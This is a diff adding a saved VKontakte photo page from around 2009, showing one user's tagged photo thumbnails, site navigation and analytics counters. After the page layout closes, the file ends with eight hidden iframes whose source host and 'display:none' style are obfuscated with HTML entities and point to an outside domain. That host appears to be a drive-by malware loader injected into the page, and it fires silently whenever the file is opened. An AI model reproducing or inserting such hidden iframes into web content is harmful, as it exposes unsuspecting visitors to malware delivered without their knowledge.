@@ -1,0 +1,228 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="vkontakte">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
+<title>В Контакте | Фотографии</title>
+<link rel="stylesheet" href="/css/rustyle.css?27" type="text/css" />
+<script>var base_domain = '/';</script><script src="/js/common.js?31"></script>
+<link rel="stylesheet" href="/css/dialog2.css" type="text/css" />
+<link rel="stylesheet" href="/css/mail2.css" type="text/css" />
+<link rel="stylesheet" href="/css/search.css" type="text/css" />
+<link rel="stylesheet" href="/css/rustylex.css" type="text/css" />
+<script type="text/javascript" src="/js/photo.js?6"></script>
+<link rel="stylesheet" href="/css/photos2.css?20" type="text/css" />
+<script src="/js/langRus.js?5"></script><link rel="stylesheet" href="/css/nopadding.css" type="text/css" />
+<script src="/js/langRus.js?5"></script>
+
+<link rel="shortcut icon" href="http://vkontakte.ru/images/favicon.ico" />
+<!--[if lte IE 6]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/ie.css); /* ]]> */</style><![endif]-->
+<!--[if gte IE 7]><style type="text/css" media="screen">/* <![CDATA[ */ @import url(/css/ie7.css); /* ]]> */</style><![endif]-->
+<script src="/js/niftycube.js?1"></script>
+
+<script type="text/javascript">
+<!--
+(function(){
+	var loadFn = function(){
+		Nifty("ul.tabs a", "small top");
+		Nifty("ul.buttonRow a", "small");
+		Nifty("div.leftAd","small transparent");
+		Nifty("div.selPad","small transparent");
+		Nifty("div.myPad", "small transparent");
+	};
+	//addEvent(window, 'load', loadFn);
+	onDomReady(loadFn);
+})();
+//-->
+</script>
+</head>
+
+<body>
+
+ <div id="pageLayout">
+
+<!-- pageHeader -->
+
+  <div id="pageHeader">
+
+   <h1 id="home"><a href="/index.php">ВКонтакте</a></h1>
+
+<div id="quickSearch">
+ <div id='qquery'>
+  <input id='qinput' autocomplete='off' onkeyup="friendFilter(event)" onfocus="searchOn(this)" onblur="searchOut(this)" name="q" placeholder="Поиск" value="Поиск"/><span id='qchoose'></span>
+ </div>
+</div>
+<script type="text/javascript">
+ge('qinput').value='Поиск';
+</script><div id="qfriends"></div>
+<div id="qdropdown"></div>
+
+<ul id="topNav" class="topNav">
+ <li style="width:0.2em"></li>
+ <li style="width:5.2em"><a href='/login.php?op=logout'>выйти</a></li>
+ <li style="width:7.3em"><a href='/invite.php?82780'>пригласить</a></li>
+<!-- <li style="width:6.0em"><a href='/ebrowse.php?82780'>события</a></li> -->
+ <li style="width:8.0em"><a href='/market.php?act=list'>объявления</a></li>
+ <li style="width:4.7em"><a href='/people.php?82780'>люди</a></li>
+ <li style="width:5.2em"><a href='/browse.php?82780'>группы</a></li>
+ <li style="width:4.8em"><a href='/search.php?act=mixed&82780'>поиск</a></li>
+ <li style="width:6.0em"><a href='/id32752164?82780'>главная</a></li>
+</ul>
+
+
+  </div>
+
+<!-- End pageHeader -->
+
+<!-- sideBar -->
+
+  <div id="sideBar">
+
+      <ol id='nav'>
+    <li id='myprofile'><a href='/id32752164?82780' class='hasedit'>Моя Страница</a> <a href='/profileEdit.php?82780' class='edit'>ред.</a></li>
+    <li id='myfriends'><a href='/friend.php?82780'>Мои Друзья</a></li>
+    <li><a href='/photos.php?82780'>Мои Фотографии</a></li>
+    <li><a href='/video.php?82780'>Мои Видеозаписи</a></li>
+    
+    <li><a href='/mail.php?id=32752164&82780'>Мои Сообщения</a></li>
+    <li><a href='/notes.php?82780'>Мои Заметки</a></li>
+    <li><a href='/groups.php?82780'>Мои Группы</a></li>
+    <li><a href='/events.php?82780'>Мои Встречи</a></li>
+    <li><a href='/news.php?82780'>Мои Новости</a></li>
+    <li><a href='/settings.php?82780'>Мои Настройки</a></li>
+    <div class='moreDiv'><ol id='nav' style='margin-bottom:0px;'><li><a class='more' href='/opinions.php?82780'>Мнения</a></li><li><a class='more' href='/apps.php'>Приложения</a></li><li><a class='more' href='/questions.php'>Вопросы</a></li><li><a class='more' href='/market.php?act=list'>Объявления</a></li></ol></div>
+   </ol>
+   
+   
+  </div>
+
+<!-- End sideBar -->
+
+<!-- pageBody -->
+
+  <div id="pageBody" class="pageBody">
+
+  <div id="wrapH">
+  <div id="wrapHI">
+   <div id="header">
+    <h1> Андрей Третьяк на фотографиях</h1>
+   </div>
+  </div>
+  </div>
+
+  <div id="wrap2">
+  <div id="wrap1">
+   <div id="content">
+
+    
+<div class="bar clearFix summaryBar">
+ <div class="summary">9 фотографий<span class='divider'>|</span><a class="notbold" href="/id24179296">К странице пользователя</a></div>
+</div>
+
+<div id="searchResults" class="searchResults clearFix">
+  
+  <div class="sectiontype">Фотографии, которые отметили другие участники</div> <div id="album">
+  <table border="0" cellspacing="0">
+   <tr>
+    
+<td><a href="photos.php?act=show&id=-5419542_118972827&uid=24179296">
+<IMG SRC="http://cs275.vkontakte.ru/u7294320/54040281/m_5b0ef34f.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=8236448_119682922&uid=24179296">
+<IMG SRC="http://cs1674.vkontakte.ru/u8236448/45963650/m_436bc078.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=5151092_121159212&uid=24179296">
+<IMG SRC="http://cs1677.vkontakte.ru/u5151092/25869159/m_ce9fef58.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=5151092_122836949&uid=24179296">
+<IMG SRC="http://cs1831.vkontakte.ru/u5151092/25869159/m_d3ba2433.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+</tr><tr>
+<td><a href="photos.php?act=show&id=4037007_123215474&uid=24179296">
+<IMG SRC="images/m_null.gif" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=2843161_124719013&uid=24179296">
+<IMG SRC="http://cs1900.vkontakte.ru/u2843161/17798142/m_db6e9fbc.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=3228571_124780414&uid=24179296">
+<IMG SRC="http://cs1495.vkontakte.ru/u3228571/74201291/m_5fb0e158.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+<td><a href="photos.php?act=show&id=3228571_124780415&uid=24179296">
+<IMG SRC="http://cs1495.vkontakte.ru/u3228571/74201291/m_46771182.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+</tr><tr>
+<td><a href="photos.php?act=show&id=3228571_127009704&uid=24179296">
+<IMG SRC="http://cs4204.vkontakte.ru/u3228571/74204354/m_8215e8ab.jpg" onMouseOver="this.style.borderColor='#45688E'" onMouseOut="this.style.borderColor=''" style="max-width:130px;"></a></td>
+
+   </tr>
+  </table>
+ </div>
+  
+</div>
+
+    
+   </div>
+  </div>
+  </div>
+
+  </div>
+  <div id="boxHolder"></div>
+
+<!-- End pageBody -->
+
+
+
+<!-- bFooter -->
+  <div id="bFooter">
+   <ul class="bNav" style="text-align: center">
+    <li><a href="/help.php?page=about">о сайте</a></li>
+    <li><a href="/techsupp.php">техподдержка</a></li>
+    <li><a href="/blog.php">блог</a></li>
+    <li><a href="/help.php?page=terms">правила</a></li>
+    <li><a href="/help.php?page=adv">реклама</a></li>
+   </ul>
+  </div> 
+
+  <div id="bFooter"> 
+   <p>В Контакте &copy; 2006-2009<br /><small><a href="http://vkontakte.ru/id1">Павел Дуров</a></small></p>
+  </div>
+<!-- tns-counter.ru -->
+<script type="text/javascript">
+<!--
+onDomReady(function(){
+//addEvent(window, 'load', function(){
+	var img = new Image();
+	img.src = 'http://www.tns-counter.ru/V13a***R>' + document.referrer.replace(/\*/g,'%2a') + '*vkontakte_ru/ru/CP1251/tmsec=vkontakte_total/';
+});	
+//-->
+</script>
+<noscript>
+	<img src="http://www.tns-counter.ru/V13a****vkontakte_ru/ru/CP1251/tmsec=vkontakte_total/" width="1" height="1" alt="" />
+</noscript>
+<!--/ tns-counter.ru -->
+<!--LiveInternet counter-->
+<script type="text/javascript">
+<!--
+onDomReady(function(){
+//addEvent(window, 'load', function(){
+	var img = new Image();
+	img.src = 'http://counter.yadro.ru/hit?r' + escape(document.referrer) + ((typeof(screen)=='undefined')?'':';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?screen.colorDepth:screen.pixelDepth)) + ';u' + escape(document.URL) + ';' + Math.random() + '';
+});	
+//-->
+</script>
+<!--/LiveInternet-->
+<!-- End bFooter -->
+
+</div>
+
+<!-- End pageLayout 837 -->
+
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+</body>
+</html>
